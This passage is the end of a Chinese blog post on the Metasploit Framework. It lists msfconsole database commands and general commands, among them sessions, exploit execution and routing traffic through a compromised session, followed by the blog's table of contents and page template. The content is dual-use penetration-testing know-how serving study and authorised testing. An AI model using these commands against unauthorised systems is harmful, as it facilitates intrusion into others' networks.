<blockquote>
<ul>
<li>hosts   # 查看当前数据库存储的主机信息</li>
<li>host 1.1.1.1   # 过滤 ip</li>
<li>hosts -u   # 只显示 up 的主机</li>
<li>hosts -c address,os_name  # 显示指定列名的数据  </li>
<li>hosts -c address,os_name  -S xxx  # 显示指定列名的数据，-S 过滤出包含 xxx 的数据  </li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>services # 显示 port、协议相关的信息</li>
<li>services -p 443  # -p 根据端口过滤</li>
</ul>
</blockquote>
</li>
<li><p>db_remove         </p>
</li>
<li><p>db_status<br>查看当前连接数据库状态（postgresql），若没有连接，可以尝试手动启动 postgresql</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> msfdb start  <span class="comment"># 尝试启动 msfdb</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> msfdb reinit <span class="comment"># 初始化</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> netstat -pantu | grep 5432  <span class="comment"># 查看 postgresql 是否启动，5432 是 postgresql 默认端口</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> service postgresql start  <span class="comment"># 启动 postgresql</span></span> </span><br></pre></td></tr></table></figure></li>
<li><p>db_disconnect</p>
</li>
<li><p>db_import</p>
</li>
<li><p>db_rebuild_cache<br>msf 所有模块都在<code>/usr/share/metasploit-framework/modules</code>下，使用<code>db_rebuild_cache</code>可以将模块加载到数据库中，能使检索效率更快。</p>
</li>
<li><p>db_save</p>
</li>
</ul>
<h2 id="3-3-MSF-功能使用命令"><a href="#3-3-MSF-功能使用命令" class="headerlink" title="3.3 MSF 功能使用命令"></a>3.3 MSF 功能使用命令</h2><ul>
<li>set/unset ：设置/取消设置</li>
<li>setg/unsetg：全局设置（g=globel）</li>
<li>save：保存当前配置至文件(/root/.msf/config)</li>
<li>run/exploit：执行</li>
<li>jobs：正在执行的 exploit</li>
<li>kill</li>
<li>load/unload/loadpath<ul>
<li>load：加载外部插件，如 <code>load openvas</code>扫描</li>
<li>loadpath：调用指定目录里的 module</li>
</ul>
</li>
<li>session：攻击主机与目标主机维持的 session(shell、meterpreter session、VNC)<ul>
<li>session -i id：进入对应 id 的 session</li>
</ul>
</li>
<li>route：通过指定的 session 建立的连接来路由流量，而不用常规路由<ul>
<li><code>route add 10.1.1.0 255.255.255.0 4</code>，将通往 10.1.1.0 网段的流量通过 id 为 4 的 seesion 来路由 </li>
</ul>
</li>
<li>irb（Framework::version）：类似于 ipython，开发页面</li>
<li>resource：指定资源文件（将rhost、rport等设置写在文件 r.rc 中，通过 resource 可以直接设置成功）<ul>
<li>没进到 MSF console 时，在系统shell 可以通过 msfconsole -r 实现</li>
</ul>
</li>
</ul>

    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章推荐</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\tcpdump\" rel="bookmark">tcpdump</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\wireshark\" rel="bookmark">wireshark</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\cybersecurity\netcat\" rel="bookmark">netcat</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\cybersecurity\超详细SQLMap使用攻略及技巧分享\" rel="bookmark">超详细SQLMap使用攻略及技巧分享</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\Virtualbox虚拟机网络连接方式详解\" rel="bookmark">Virtualbox虚拟机网络连接方式详解</a></div>
    </li>
  </ul>

        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="Charles 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.jpg" alt="Charles 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Charles
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://cs-cshi.github.io/cybersecurity/Metasploit%20Framework/" title="Metasploit Framework">https://cs-cshi.github.io/cybersecurity/Metasploit Framework/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/pyshark%20%E8%A7%A3%E6%9E%90pcap%E8%8E%B7%E5%BE%97%20http%20header/" rel="prev" title="pyshark 解析 pcap 获取 http header">
      <i class="fa fa-chevron-left"></i> pyshark 解析 pcap 获取 http header
    </a></div>
      <div class="post-nav-item">
    <a href="/cybersecurity/XCTF%E9%A2%98%E7%9B%AE/" rel="next" title="XCTF 攻防世界刷题">
      XCTF 攻防世界刷题 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录 | toc
        </li>
        <li class="sidebar-nav-overview">
          站点概览 | overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="nav-text">0. 渗透测试基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-1-PTES-%E4%B8%AD%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5"><span class="nav-text">0.1 PTES 中渗透测试阶段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0-2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%B1%BB%E5%9E%8B"><span class="nav-text">0.2 渗透测试类型</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Metasploit-Framework"><span class="nav-text">1. Metasploit Framework</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD"><span class="nav-text">1.1 专业术语</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-1-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB-exploit"><span class="nav-text">1.1.1 渗透攻击(exploit)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-2-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7-payload"><span class="nav-text">1.1.2 攻击载荷(payload)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-3-shellcode"><span class="nav-text">1.1.3 shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-4-%E6%A8%A1%E5%9D%97-module"><span class="nav-text">1.1.4 模块(module)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-5-%E7%9B%91%E5%90%AC%E5%99%A8%EF%BC%88Listener%EF%BC%89"><span class="nav-text">1.1.5 监听器（Listener）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-Metasploit-%E7%94%A8%E6%88%B7%E6%8E%A5%E5%8F%A3"><span class="nav-text">1.2 Metasploit 用户接口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-MSF-%E7%BB%88%E7%AB%AF"><span class="nav-text">1.2.1 MSF 终端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-MSF-%E5%91%BD%E4%BB%A4%E8%A1%8C"><span class="nav-text">1.2.2 MSF 命令行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-3-Armitage"><span class="nav-text">1.2.3 Armitage</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-Metasploit-%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F"><span class="nav-text">1.3 Metasploit 功能程序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-1-MSF-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90%E5%99%A8"><span class="nav-text">1.3.1 MSF 攻击载荷生成器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-2-MSF-%E7%BC%96%E7%A0%81%E5%99%A8"><span class="nav-text">1.3.2 MSF 编码器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-3-Nasm-shell"><span class="nav-text">1.3.3 Nasm shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-MSF-%E6%9E%B6%E6%9E%84"><span class="nav-text">2. MSF 架构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%83%85%E6%8A%A5%E6%90%9C%E9%9B%86"><span class="nav-text">3. 情报搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">3.1 被动信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-1-whois-%E6%9F%A5%E8%AF%A2"><span class="nav-text">3.1.1 whois 查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-2-Netcraft"><span class="nav-text">3.1.2 Netcraft</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-3-nslookup"><span class="nav-text">3.1.3 nslookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-4-Google-Hacking"><span class="nav-text">3.1.4 Google Hacking</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">3.2 主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-1-%E4%BD%BF%E7%94%A8-nmap-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">3.2.1 使用 nmap 进行端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-2-%E5%9C%A8-Metasploit-%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">3.2.2 在 Metasploit 中使用数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%B0%86-nmap-%E8%BE%93%E5%85%A5%E7%9A%84%E7%BB%93%E6%9E%9C%E5%AF%BC%E5%85%A5-metasploit"><span class="nav-text">1. 将 nmap 输入的结果导入 metasploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%AB%98%E7%BA%A7-nmap-%E6%89%AB%E6%8F%8F%E6%8A%80%E5%B7%A7%EF%BC%9ATCP-%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F"><span class="nav-text">2. 高级 nmap 扫描技巧：TCP 空闲扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%9C%A8-MSF-%E7%BB%88%E7%AB%AF%E8%BF%90%E8%A1%8C-nmap"><span class="nav-text">3. 在 MSF 终端运行 nmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-3-%E4%BD%BF%E7%94%A8-Metasploit-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">3.2.3 使用 Metasploit 进行端口扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E9%92%88%E5%AF%B9%E6%80%A7%E6%89%AB%E6%8F%8F"><span class="nav-text">3.3 针对性扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-1-SMB%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97%EF%BC%89-%E5%8D%8F%E8%AE%AE%E6%89%AB%E6%8F%8F"><span class="nav-text">3.3.1 SMB（服务器消息块） 协议扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-2-%E6%90%9C%E5%AF%BB%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84-Microsoft-SQL-Server"><span class="nav-text">3.3.2 搜寻配置不当的 Microsoft SQL Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-3-SSH-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%AB%E6%8F%8F"><span class="nav-text">3.3.3 SSH 服务器扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-4-FTP-%E6%89%AB%E6%8F%8F"><span class="nav-text">3.3.4 FTP 扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-5-%E7%AE%80%E5%8D%95%E7%BD%91%E7%AE%A1%E5%8D%8F%E8%AE%AE%EF%BC%88SNMP%EF%BC%89%E6%89%AB%E6%8F%8F"><span class="nav-text">3.3.5 简单网管协议（SNMP）扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E7%BC%96%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="nav-text">3.4 编写自己的扫描器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-text">4. 漏洞扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-text">4.1 基本的漏洞扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-Nexpose"><span class="nav-text">4.2 Nexpose</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-1-%E5%9C%A8-MSF-%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B8%AD%E8%BF%90%E8%A1%8C-Nexpose"><span class="nav-text">4.2.1 在 MSF 控制台中运行 Nexpose</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E4%B9%8B%E6%97%85"><span class="nav-text">5. 渗透攻击之旅</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80"><span class="nav-text">5.1 渗透攻击基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">5.2 第一次渗透攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-%E6%94%BB%E5%87%BB-Metasploitable-%E4%B8%BB%E6%9C%BA"><span class="nav-text">5.3 攻击 Metasploitable 主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-4-%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%EF%BC%9A%E6%9A%B4%E5%8A%9B%E7%8C%9C%E8%A7%A3%E7%9B%AE%E6%A0%87%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="nav-text">5.4 全端口攻击载荷：暴力猜解目标开放的端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-5-%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6"><span class="nav-text">5.5 资源文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-Meterpreter"><span class="nav-text">6. Meterpreter</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-%E6%94%BB%E9%99%B7-Windows-XP-%E8%99%9A%E6%9C%BA"><span class="nav-text">6.1 攻陷 Windows XP 虚机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-1-%E4%BD%BF%E7%94%A8-nmap-%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="nav-text">6.1.1 使用 nmap 扫描端口</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4"><span class="nav-text">4. 控制台命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="nav-text">3.1 常见命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="nav-text">3.2 数据库相关命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-MSF-%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-text">3.3 MSF 功能使用命令</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Charles"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Charles</p>
  <div class="site-description" itemprop="description">慢下来，记录生活点滴，畅游人类知识和艺术的海洋。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">44</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/cs-cshi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cs-cshi" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/572081809@qq.com" title="E-Mail → 572081809@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/dataStrutures/leetcode/" title="dataStrutures&#x2F;leetcode&#x2F;">leetcode 刷题</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/Virtualbox%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3/" title="Virtualbox虚拟机网络连接方式详解&#x2F;">Virtualbox虚拟机网络连接方式详解</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/cybersecurity/XCTF%E9%A2%98%E7%9B%AE/" title="cybersecurity&#x2F;XCTF题目&#x2F;">XCTF 攻防世界刷题</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/cybersecurity/Metasploit%20Framework/" title="cybersecurity&#x2F;Metasploit Framework&#x2F;">Metasploit Framework</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/pyshark%20%E8%A7%A3%E6%9E%90pcap%E8%8E%B7%E5%BE%97%20http%20header/" title="pyshark 解析pcap获得 http header&#x2F;">pyshark 解析 pcap 获取 http header</a>
        </li>
    </ul>
  </div>

      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Charles</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">236k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">3:35</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'https://cs-cshi.github.io/cybersecurity/Metasploit%20Framework/',]
      });
      });
  </script>


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'hbdf2zNhxCCzlSuodiOKirnE-gzGzoHsz',
      appKey     : 'gJuRc9Mu4JIB0czCtRefSodC',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
